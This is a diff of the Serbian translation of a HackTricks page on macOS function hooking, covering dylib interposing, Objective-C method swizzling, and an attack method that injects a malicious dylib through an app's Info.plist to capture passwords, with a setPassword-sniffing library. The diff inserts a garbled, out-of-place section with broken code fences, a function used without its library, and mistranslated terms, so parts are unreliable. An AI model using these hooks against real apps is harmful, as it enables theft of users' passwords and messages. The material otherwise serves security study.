@@ -1,4 +1,4 @@
-# macOS Function Hooking
+# macOS Hakovanje Funkcija
 
 <details>
 
@@ -6,21 +6,21 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
-## Interponiranje funkcija
+## Interpolacija Funkcija
 
 Kreirajte **dylib** sa **`__interpose`** sekcijom (ili sekcijom označenom sa **`S_INTERPOSING`**) koja sadrži tuple **pokazivača na funkcije** koji se odnose na **originalne** i **zamenske** funkcije.
 
-Zatim, **ubacite** dylib sa **`DYLD_INSERT_LIBRARIES`** (interponiranje treba da se desi pre nego što se glavna aplikacija učita). Očigledno, [**ograničenja** koja se primenjuju na korišćenje **`DYLD_INSERT_LIBRARIES`** se takođe primenjuju ovde](macos-library-injection/#check-restrictions).
+Zatim, **ubacite** dylib sa **`DYLD_INSERT_LIBRARIES`** (interpolacija mora da se desi pre nego što se glavna aplikacija učita). Očigledno, [**ograničenja** primenjena na korišćenje **`DYLD_INSERT_LIBRARIES`** se takođe primenjuju ovde](macos-library-injection/#check-restrictions).
 
-### Interponiranje printf
+### Interpolacija printf
 
 {% tabs %}
 {% tab title="interpose.c" %}
@@ -46,7 +46,7 @@ __attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned lon
 {% endcode %}
 {% endtab %}
 
-{% tab title="undefined" %}
+{% tab title="hello.c" %}
 ```c
 //gcc hello.c -o hello
 #include <stdio.h>
@@ -58,7 +58,40 @@ return 0;
 ```
 {% endtab %}
 
-{% tab title="interpose2.c" %}
+{% tab title="interpose2.c" %} 
+
+### macOS Funkcionalno Hakovanje
+
+Funkcionalno hakovanje je tehnika koja omogućava zlonamernom korisniku da preuzme kontrolu nad izvršavanjem programa tako što menja ili preusmerava pozive funkcija. Ovo se može postići korišćenjem funkcije `interpose` u macOS-u.
+
+Evo primera koda koji demonstrira kako se funkcionalno hakovanje može koristiti za preusmeravanje poziva funkcije `open` na sopstvenu funkciju `my_open`:
+
+```c
+#define _DARWIN_C_SOURCE
+#include <stdio.h>
+#include <dlfcn.h>
+
+int (*original_open)(const char *, int, mode_t);
+
+int my_open(const char *path, int flags, mode_t mode) {
+    printf("Hacked open function\n");
+    return original_open(path, flags, mode);
+}
+
+__attribute__((constructor))
+void init() {
+    original_open = dlsym(RTLD_NEXT, "open");
+    if (original_open == NULL) {
+        fprintf(stderr, "Error in `dlsym`: %s\n", dlerror());
+    }
+    printf("Original open function address: %p\n", original_open);
+    rebind_symbols((struct rebinding[]){{"open", my_open, (void *)&original_open}}, 1);
+}
+```
+
+U ovom primeru, funkcija `my_open` se koristi za preusmeravanje poziva funkcije `open`, a zatim se poziva originalna funkcija `open` sa istim argumentima.
+
+Ova tehnika može biti korisna za različite svrhe, uključujući praćenje ili manipulaciju sistema. Međutim, važno je napomenuti da je funkcionalno hakovanje moćan alat koji može biti zloupotrebljen u nelegalne svrhe.
 ```c
 // Just another way to define an interpose
 // gcc -dynamiclib interpose2.c -o interpose2.dylib
@@ -84,7 +117,6 @@ DYLD_INTERPOSE(my_printf,printf);
 ```
 {% endtab %}
 {% endtabs %}
-
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
 Hello from interpose
@@ -92,25 +124,23 @@ Hello from interpose
 DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
 Hello from interpose
 ```
+## Zamena metoda
 
-## Metoda Swizzling
+U ObjectiveC-u se metoda poziva na sledeći način: **`[mojObjekatIme imeMetodePrviParam:param1 drugiParam:param2]`**
 
-U ObjectiveC-u se metoda poziva na sledeći način: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
+Potrebni su **objekat**, **metoda** i **parametri**. Kada se metoda pozove, **poruka se šalje** koristeći funkciju **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(nekiObjekat, @selector(metoda1p1:p2:), vrednost1, vrednost2);`
 
-Potrebni su **objekat**, **metoda** i **parametri**. Kada se metoda pozove, **poruka se šalje** koristeći funkciju **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
+Objekat je **`nekiObjekat`**, metoda je **`@selector(metoda1p1:p2:)`** a argumenti su **vrednost1**, **vrednost2**.
 
-Objekat je **`someObject`**, metoda je **`@selector(method1p1:p2:)`** i argumenti su **value1**, **value2**.
-
-Prateći strukture objekata, moguće je doći do **niza metoda** gde se **nalaze nazivi** i **pokazivači** na kod metode.
+Prateći strukture objekata, moguće je doći do **niza metoda** gde su **imena** i **pokazivači** na kod metoda **locirani**.
 
 {% hint style="danger" %}
-Imajte na umu da se zbog pristupa metodama i klasama na osnovu njihovih naziva, ove informacije čuvaju u binarnom formatu, pa je moguće dobiti pristup njima pomoću `otool -ov </path/bin>` ili [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
+Imajte na umu da se zbog toga što se metode i klase pristupaju na osnovu njihovih imena, ove informacije se čuvaju u binarnom obliku, pa je moguće doći do njih korišćenjem `otool -ov </putanja/bin>` ili [`class-dump </putanja/bin>`](https://github.com/nygard/class-dump)
 {% endhint %}
 
 ### Pristupanje sirovim metodama
 
-Moguće je pristupiti informacijama o metodama kao što su naziv, broj parametara ili adresa, kao u sledećem primeru:
-
+Moguće je pristupiti informacijama o metodama kao što su ime, broj parametara ili adresa kao u sledećem primeru:
 ```objectivec
 // gcc -framework Foundation test.m -o test
 
@@ -176,15 +206,13 @@ NSLog(@"Uppercase string: %@", uppercaseString3);
 return 0;
 }
 ```
-
 ### Zamena metoda pomoću method\_exchangeImplementations
 
-Funkcija **`method_exchangeImplementations`** omogućava **promenu** **adrese** **implementacije** jedne funkcije za drugu.
+Funkcija **`method_exchangeImplementations`** omogućava **promenu** adrese **implementacije** jedne funkcije za drugu.
 
 {% hint style="danger" %}
-Dakle, kada se pozove funkcija, izvršava se druga funkcija.
+Dakle, kada se pozove funkcija, izvršava se **druga funkcija**.
 {% endhint %}
-
 ```objectivec
 //gcc -framework Foundation swizzle_str.m -o swizzle_str
 
@@ -228,9 +256,8 @@ NSLog(@"Substring: %@", subString);
 return 0;
 }
 ```
-
 {% hint style="warning" %}
-U ovom slučaju, ako **implementacioni kod legitimne** metode **proverava** ime metode, mogao bi **detektovati** ovu zamenu i sprečiti je da se izvrši.
+U ovom slučaju, ako **implementacioni kod legitimne** metode **proverava** **ime metode**, mogao bi **detektovati** ovu zamenu i sprečiti je da se izvrši.
 
 Sledeća tehnika nema ovu restrikciju.
 {% endhint %}
@@ -239,8 +266,7 @@ Sledeća tehnika nema ovu restrikciju.
 
 Prethodni format je čudan jer menjate implementaciju 2 metode jednu drugom. Korišćenjem funkcije **`method_setImplementation`** možete **promeniti implementaciju** jedne **metode za drugu**.
 
-Samo se setite da **sačuvate adresu implementacije originalne metode** ako ćete je pozivati iz nove implementacije pre nego što je prepišete, jer će kasnije biti mnogo komplikovano locirati tu adresu.
-
+Samo zapamtite da **sačuvate adresu implementacije originalne metode** ako ćete je pozvati iz nove implementacije pre nego što je prepišete, jer će kasnije biti mnogo komplikovanije locirati tu adresu.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
@@ -292,19 +318,17 @@ return 0;
 }
 }
 ```
+## Metodologija napada pomoću kvačenja funkcija
 
-## Metodologija napada korišćenjem hookinga
+Na ovoj stranici razmatrane su različite metode kvačenja funkcija. Međutim, one uključuju **izvršavanje koda unutar procesa radi napada**.
 
-Na ovoj stranici su razmatrani različiti načini za hookovanje funkcija. Međutim, oni uključuju **izvršavanje koda unutar procesa kako bi se izvršio napad**.
+Da biste to uradili, najlakša tehnika koju možete koristiti je ubacivanje [Dyld putem promenljivih okruženja ili preuzimanje kontrole](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Međutim, pretpostavljam da se to takođe može uraditi putem [Dylib procesnog ubacivanja](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).
 
-Da bi se to postiglo, najlakša tehnika koju možete koristiti je ubrizgavanje [Dyld-a putem promenljivih okruženja ili preuzimanje kontrole](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Međutim, pretpostavljam da se to takođe može uraditi putem [Dylib procesnog ubrizgavanja](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).
+Međutim, oba opcije su **ograničena** na **nezaštićene** binarne fajlove/procese. Proverite svaku tehniku da biste saznali više o ograničenjima.
 
-Međutim, obe opcije su **ograničene** na **nezaštićene** binarne fajlove/procese. Proverite svaku tehniku da biste saznali više o ograničenjima.
+Međutim, napad kvačenja funkcija je vrlo specifičan, napadač će to uraditi da bi **ukrao osetljive informacije iznutra procesa** (ako ne biste samo izvršili napad ubacivanja procesa). A ove osetljive informacije mogu se nalaziti u aplikacijama koje je korisnik preuzeo, poput MacPass-a.
 
-Međutim, napad korišćenjem hookinga je veoma specifičan, napadač će to uraditi kako bi **ukrao osetljive informacije iznutra procesa** (ako to nije slučaj, onda bi se koristio napad ubrizgavanjem procesa). A ove osetljive informacije mogu se nalaziti u aplikacijama koje su preuzete od strane korisnika, kao što je MacPass.
-
-Dakle, vektor napadača bi bio da pronađe ranjivost ili ukloni potpis aplikacije, ubrizga **`DYLD_INSERT_LIBRARIES`** promenljivu okruženja putem Info.plist fajla aplikacije dodajući nešto poput:
-
+Stoga bi vektor napada bio da napadač ili pronađe ranjivost ili ukloni potpis aplikacije, ubaci **`DYLD_INSERT_LIBRARIES`** env promenljivu putem Info.plist fajla aplikacije dodajući nešto poput:
 ```xml
 <key>LSEnvironment</key>
 <dict>
@@ -312,8 +336,7 @@ Dakle, vektor napadača bi bio da pronađe ranjivost ili ukloni potpis aplikacij
 <string>/Applications/Application.app/Contents/malicious.dylib</string>
 </dict>
 ```
-
-a zatim **ponovo registrujte** aplikaciju:
+i zatim **ponovo registrujte** aplikaciju:
 
 {% code overflow="wrap" %}
 ```bash
@@ -324,11 +347,10 @@ a zatim **ponovo registrujte** aplikaciju:
 Dodajte u tu biblioteku kod za hakovanje kako biste izvukli informacije: Lozinke, poruke...
 
 {% hint style="danger" %}
-Imajte na umu da u novijim verzijama macOS-a, ako **uklonite potpis** aplikacijskog binarnog koda i ako je prethodno izvršen, macOS više **neće izvršavati aplikaciju**.
+Imajte na umu da u novijim verzijama macOS-a, ako **uklonite potpis** aplikacionog binarnog fajla i ako je prethodno izvršen, macOS više **neće izvršavati aplikaciju**.
 {% endhint %}
 
 #### Primer biblioteke
-
 ```objectivec
 // gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib
 
@@ -364,7 +386,6 @@ IMP fake_IMP = (IMP)custom_setPassword;
 real_setPassword = method_setImplementation(real_Method, fake_IMP);
 }
 ```
-
 ## Reference
 
 * [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
@@ -375,10 +396,10 @@ real_setPassword = method_setImplementation(real_Method, fake_IMP);
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
